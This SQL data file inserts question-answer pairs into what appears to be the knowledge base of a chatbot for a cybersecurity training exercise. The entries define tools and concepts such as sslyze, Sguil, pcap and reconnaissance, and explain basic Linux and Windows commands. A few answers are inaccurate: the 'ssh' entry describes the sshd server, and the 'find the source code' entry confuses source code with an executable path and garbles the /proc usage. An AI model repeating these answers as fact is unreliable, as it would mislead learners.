INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (65, NULL, NULL, N'what is sslyze?', N'what is sslyze', N'SSLyze is a Python tool that can analyze the SSL configuration of a server by connecting to it. It is designed to be fast and comprehensive, and should help organizations and testers identify mis-configurations affecting their SSL servers.', NULL, N'6864bfc4a31e496c96bca8e7c247494f')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (66, NULL, NULL, N'what is objdump?', N'what is objdump', N'Objdump is a program for displaying various information about object files. For instance, it can be used as a disassembler to view an executable in assembly form.', NULL, N'bff59427898b47ff8856c9bc88a7d765')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (67, NULL, NULL, N'what is drupal?', N'what is drupal', N'Drupal is free, open source software that can be used by individuals or groups of users -- even those lacking technical skills -- to easily create and manage many types of Web sites. The application includes a content management platform and a development framework.', NULL, N'376f3bff1e534ae9a166504b9de3582d')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (68, NULL, NULL, N'what is /etc/services?', N'what is /etc/services', N'On UNIX, the configuration file /etc/services maps port numbers to named services.', NULL, N'e1aa65cd14b34ca8ae1398c563536b58')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (69, NULL, NULL, N'what is ssh?', N'what is ssh', N'sshd is the OpenSSH server process. It listens to incoming connections using the SSH protocol and acts as the server for the protocol. It handles user authentication, encryption, terminal connections, file transfers, and tunneling.', NULL, N'0a771df2b9b54145be8bbdae163b7d7b')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (70, NULL, NULL, N'what is tcp?', N'what is tcp', N'The Transmission Control Protocol (TCP) is one of the main protocols of the Internet protocol suite. It originated in the initial network implementation in which it complemented the Internet Protocol (IP). Therefore, the entire suite is commonly referred to as TCP/IP. TCP provides reliable, ordered, and error-checked delivery of a stream of octets between applications running on hosts communicating by an IP network. Major Internet applications such as the World Wide Web, email, remote administration, and file transfer rely on TCP.', NULL, N'875cd6b24f3a487cab1bdc8b0693d5c9')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (71, NULL, NULL, N'what is osi?', N'what is osi', N'OSI (Open Systems Interconnection) is a reference model for how applications can communicate over a network. A reference model is a conceptual framework for understanding relationships.', NULL, N'8570e0e4f64141b1811280acf2aa0b68')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (72, NULL, NULL, N'what is HexExplorer?', N'what is hexexplorer', N'HexExplorer is a hexeditor for Windows.', NULL, N'c452f1357d55451e95d8a7a9b587e6b8')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (73, NULL, NULL, N'what is a stack?', N'what is a stack', N'In computer science, a call stack is a stack data structure that stores information about the active subroutines of a computer program. This kind of stack is also known as an execution stack, program stack, control stack, run-time stack, or machine stack, and is often shortened to just ''the stack''.', NULL, N'ff2af089f2fc4e898f000d07670fa506')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (74, NULL, NULL, N'what is a binary file?', N'what is a binary file', N'A binary file is a file stored in binary format. A binary file is computer-readable but not human-readable. All executable programs are stored in binary files, as are most numeric data files. In contrast, text files are stored in a form (usually ASCII) that is human-readable.', NULL, N'08a31c2667274277a62c0c02a61cd429')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (75, NULL, NULL, N'what is an IP ID?', N'what is an ip id', N'In IPv4, the Identification (ID) field is a 16-bit value that is unique for every datagram for a given source address, destination address, and protocol, such that it does not repeat within the maximum datagram lifetime (MDL) [RFC791] [RFC1122]. As currently specified, all datagrams between a source and destination of a given protocol must have unique IPv4 ID values over a period of this MDL, which is typically interpreted as two minutes and is related to the recommended reassembly timeout [RFC1122]. This uniqueness is currently specified as for all datagrams, regardless of fragmentation settings.', NULL, N'9141977186e74733816dc4267690d48a')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (76, NULL, NULL, N'what is a seed?', N'what is a seed', N'A random seed (or seed state, or just seed) is a number (or vector) used to initialize a pseudorandom number generator. For a seed to be used in a pseudorandom number generator, it does not need to be random.', NULL, N'ea29738ce0b849cca77853331d9163d4')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (77, NULL, NULL, N'what is a process?', N'what is a process', N'In computing, a process is an instance of a computer program that is being executed. It contains the program code and its current activity. Depending on the operating system (OS), a process may be made up of multiple threads of execution that execute instructions concurrently.', NULL, N'33306fe5606b4b92accbbcb522ad829d')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (78, NULL, NULL, N'what is a decompiler?', N'what is a decompiler', N'A decompiler is a computer program that takes an executable file as input, and attempts to create a high level source file which can be recompiled successfully. It is therefore the opposite of a compiler, which takes a source file and makes an executable.', NULL, N'3669955c14b641c88fdd741e74f2d391')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (79, NULL, NULL, N'what is reverse engineering?', N'what is reverse engineering', N'Reverse engineering, the process of taking a software program''s binary code and recreating it so as to trace it back to the original source code, is being widely used in computer hardware and software to enhance product features or fix certain bugs.', NULL, N'f3ba08feefca4da0a1fae2bbb8dc6f81')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (80, NULL, NULL, N'what is opcode?', N'what is opcode', N'An opcode (abbreviated from operation code) is the portion of a machine language instruction that specifies the operation to be performed. Beside the opcode itself, instructions usually specify the data they will process, in form of operands.', NULL, N'de2cd0e56a134abdb58ee20ca7343185')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (81, NULL, NULL, N'What is reconnaissance?', N'what is reconnaissance', N'The word reconnaissance (often shortened to recon) is borrowed from its military use, where it refers to a mission into enemy territory to obtain information. In a computer security context, reconnaissance is usually a preliminary step toward a further attack seeking to exploit the target system. The attacker often uses port scanning, for example, to discover any vulnerable ports. You can use reconnaissance with netcat or a network mapper such as nmap to learn about the environment for this mission.', NULL, N'4126676a9432473a84da2b2c5de49091')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (82, NULL, NULL, N'how do you use sguil?', N'how do you use sguil', N'Sguil relies on Snort for its primary flow of alert data. Snort alerts populate the RealTime Events tab. By default Sguil breaks the top half of the screen into three windows. Alert information is shown in each window, with the top window showing the most severe alerts, the middle window showing less serious alerts, and the bottom window showing the least important alerts. These windows correspond to the priority levels in Snort, with priority levels 1 and 2 at the top, 3 and 4 in the middle, and 5 at the bottom. Analysts can tweak the sguil.conf configuration file to present a single pane with all alerts if they so choose. Fonts are also configurable by using Sguil''s File->Change Font sequence. The bottom part of the main Sguil display is broken vertically into two halves. The left side of the screen shows host name and Whois database information, at the discretion of the analyst. Because DNS queries for host names or lookups for Whois information may take up to several seconds, many analysts turn these options off unless they need the information. Sguil does not cache results internally, although the default DNS server usually will. The bottom of the left side of the screen shows system messages or user messages, depending on the tab selected. System messages pertain to the amount of space left on the disk collecting NSM information. User messages appear in an interactive chat application similar to Internet Relay Chat. Anyone logged in with the Sguil client to the same Sguil server can communicate via the interface in the User Messages tab.', NULL, N'6b30d2e724484822962f8b923a8115b8')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (83, NULL, NULL, N'how do I use sguil?', N'how do i use sguil', N'Sguil relies on Snort for its primary flow of alert data. Snort alerts populate the RealTime Events tab. By default Sguil breaks the top half of the screen into three windows. Alert information is shown in each window, with the top window showing the most severe alerts, the middle window showing less serious alerts, and the bottom window showing the least important alerts. These windows correspond to the priority levels in Snort, with priority levels 1 and 2 at the top, 3 and 4 in the middle, and 5 at the bottom. Analysts can tweak the sguil.conf configuration file to present a single pane with all alerts if they so choose. Fonts are also configurable by using Sguil''s File->Change Font sequence. The bottom part of the main Sguil display is broken vertically into two halves. The left side of the screen shows host name and Whois database information, at the discretion of the analyst. Because DNS queries for host names or lookups for Whois information may take up to several seconds, many analysts turn these options off unless they need the information. Sguil does not cache results internally, although the default DNS server usually will. The bottom of the left side of the screen shows system messages or user messages, depending on the tab selected. System messages pertain to the amount of space left on the disk collecting NSM information. User messages appear in an interactive chat application similar to Internet Relay Chat. Anyone logged in with the Sguil client to the same Sguil server can communicate via the interface in the User Messages tab.', NULL, N'38328cb189d3404281e3fa65f0a4299c')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (84, NULL, NULL, N'What is Network Security Monitoring (NSM)?', N'what is network security monitoring (nsm)', N'Network security monitoring involves collecting network packet data, segregating it among all the 7 OSI layers, and applying intelligent algorithms to get answers to security-related questions. The purpose is to know in real-time what is happening on the network at a detailed level, and strengthen security by hardening the processes, devices, appliances, software policies, etc. Security Onion is an open source project that provides the tools needed to do NSM.', NULL, N'64d675528b184fd8bd06dd6bd9f8ade9')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (85, NULL, NULL, N'what is tail?', N'what is tail', N'The tail command in Linux allows you to view the end of a file, the last 10 lines by default. A common use case for the tail command would be viewing recent events in a long log file. View the man page for more information.', NULL, N'9195108189784445b333ada39c441393')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (86, NULL, NULL, N'how do I use tail?', N'how do i use tail', N'You can use tail to view the end of a file (last 10 lines by default) in Linux and other Unix-like systems. For example, you could use this command to view the end of the alert file on a Snort IPS: sudo tail /var/log/snort/alert. View the manpage for more information on the available options.', NULL, N'a6a19940b7a145ef85d53bd9fcd87359')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (87, NULL, NULL, N'how do I use grep?', N'how do i use grep', N'Grep is a unix command line tool that can be used to quickly search text from either a file or standard input piped from another command. For example, to dump the contents of the file one.txt into grep to search for the string ''hotdog'', the command would be cat one.txt | grep hotdog. The output of that command would be any lines from the file one.txt that contain the text ''hotdog''.', NULL, N'8d29860791874a4f907047f111c27c4d')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (88, NULL, NULL, N'what is a PID?', N'what is a pid', N'A process ID, commonly referred to as a PID, is a number used to uniquely identify a running process on most computer Operating Systems.', NULL, N'989de4d5f7c34710b695c7e2610e12e2')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (89, NULL, NULL, N'what is ls?', N'what is ls', N'On Linux and other Unix-like systems, the ls command can be used to display the contents of the current working directory. View the man page for more information. On Windows, an equivalent command is the dir command.', NULL, N'fb0f861fd6334375a5f76d176a768cab')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (90, NULL, NULL, N'what is a working directory?', N'what is a working directory', N'In computing, the working directory of a process is a directory that is dynamically associated with the process. When you work on a computer''s command line interface you are typically using bash or some other shell that is running as a process with your working directory associated with it. The main practical implication when working in a command line is that you can reference files in your working directory by name instead of having to use an absolute or relative path. In Unix-like operating systems, you can print your current working directory with the pwd command. In Windows, an equivalent command would be: echo %cd%', NULL, N'1d89a42d9716420986157924defc888c')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (91, NULL, NULL, N'what is a pcap?', N'what is a pcap', N'Pcap is short for packet capture, and the pcap API exists to capture network traffic. Unix-like systems implement pcap in the libpcap library; Windows uses a port of libpcap known as WinPcap. The .pcap file extension is used when a packet capture is written to a file. There are numerous tools devoted to capturing and/or analyzing pcaps.', NULL, N'bca794f815d743e3b506ae4054a4d154')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (92, NULL, NULL, N'what is an API?', N'what is an api', N'API is short for Application Programming Interface. An API is a set of subroutine definitions, protocols, and tools for building software. In general terms, it is a set of clearly defined methods of communication between various software components. A good API makes it easier to develop a computer program by providing all the building blocks, which are then put together by the programmer.', NULL, N'fa21306f957b4f0ca58ea95c2282ea81')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (93, NULL, NULL, N'how do I encode a string as hexadecimal?', N'how do i encode a string as hexadecimal', N'The string ''foo'' can be converted to hex by using python like in the following example script: " ".join("{:02x}".format(ord(c)) for c in ''foo'')', NULL, N'66da3889e7d44f0b98bdb6b2c733048b')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (94, NULL, NULL, N'how do I use vi?', N'how do i use vi', N'Vi is a powerful text editor available from Unix command lines. You can open the file example.txt in vi with the following command: vi example.txt. If the file does not exist it will be created. Vi essentially has its own language which can be used to edit text files very efficiently. Vi operates in either insert mode (where typed text becomes part of the document) or normal mode (where keystrokes are interpreted as commands that control the edit session). When you open vi you will be in normal mode by default, and you can enter insert mode by pressing i and exit insert mode by pressing esc. To save and quit a file, enter :wq in normal mode.', NULL, N'dd22d6f45b904e8b80925e40e6382209')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (95, NULL, NULL, N'how do I login to the infected machine?', N'how do i login to the infected machine', N'You can login to Linux machines using ssh and you can login to Windows machines using rdesktop.', NULL, N'4697bbaafbf34f52809ffa267c9e9b73')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (96, NULL, NULL, N'how do I find the source code?', N'how do i find the source code', N'On Windows machines you can usually find source code used to start a process by right clicking, then viewing the properties of a process in Procexp or TCPView - to have access to the properties of every process, the tools should be run as administrator. On Linux you can run sudo ls the /proc/<PID>/exe directory (where <PID> is the process ID) to print the command used to start a process, which will sometimes include the absolute path. If the absolute path is not included you can use the find command with name of the file, e.g. to find all files with names starting with example and starting the search in the root directory, I could run the command: sudo find / -name example*', NULL, N'6dec59be513e4f9db6f45194bf12623b')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (97, NULL, NULL, N'how do I run a Windows tool as an administrator?', N'how do i run a windows tool as an administrator', N'Right click the tool and choose Run as Administrator. To run commands in the command prompt as administrator, you need to run the command prompt as an administrator.', NULL, N'17ba28452e394feab6f688b0c4c5b23f')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (98, NULL, NULL, N'how do I run a Linux command as an administrator?', N'how do i run a linux command as an administrator', N'You can run command line tools as administrator by prefacing the command with sudo, then entering your password if prompted to do so.', NULL, N'987156afc80e4ea586d1e622682b682f')
INSERT [dbo].[api_questionanswerpair] ([id], [mission_catalog_id_id], [objective_id], [utterance], [normalized_utterance], [answer], [difficulty], [uid]) VALUES (99, NULL, NULL, N'how do I run something as administrator?', N'how do i run something as administrator', N'For Linux machines you can run command line tools as administrator by prefacing the command with sudo, then entering your password if prompted to do so. To run a Windows tool as administrator, right click the tool and choose Run as Administrator. To run commands in the command prompt as administrator, you need to run the command prompt as an administrator.', NULL, N'4f4b429886a04c7bb979b9bb00a147c4')
